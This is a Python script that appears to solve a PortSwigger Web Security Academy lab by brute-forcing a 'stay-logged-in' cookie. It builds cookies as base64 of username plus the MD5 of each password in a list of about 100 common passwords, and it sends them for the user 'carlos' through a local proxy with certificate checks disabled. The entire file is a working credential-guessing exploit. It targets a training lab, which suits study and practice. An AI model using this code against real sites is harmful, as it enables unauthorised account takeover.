import base64
import hashlib
import http.client
import ssl

LAB_ID = "0a6100b4045307108080f920007a0033"


def GET_myaccount(
        username: str,
        stay_logged_in_cookie: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', f'/my-account?id={username}'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'cookie': f'stay-logged-in={stay_logged_in_cookie}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection('localhost', 27001, context=ssl._create_unverified_context())
    connection.set_tunnel(host, port)
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


passwords = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon',
             '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666',
             'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman', '1qaz2wsx', '7777777',
             '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm', 'asdfgh',
             'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou', '2000',
             'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233', 'george',
             'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom',
             '777777', 'pass', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda',
             'summer', 'love', 'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321',
             'dallas', 'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana',
             'moon', 'moscow']

check_cookie = base64.b64encode(f"wiener:{hashlib.md5(b'peter').hexdigest()}".encode('utf-8')).decode('utf-8')
if GET_myaccount('wiener', check_cookie).status == 200:
    print("passed sanity check.")

username = 'carlos'
for i, password in enumerate(passwords):
    print(f"{i / len(passwords) * 100}% done, trying {username}:{password}")
    cookie = base64.b64encode(f"{username}:{hashlib.md5(password.encode('utf-8')).hexdigest()}".encode('utf-8')).decode(
        'utf-8')
    response = GET_myaccount(username, cookie)
    if response.status == 200:
        print(f"found correct cookie: {cookie}")
        break
else:
    print(f"could not find password for {username}")
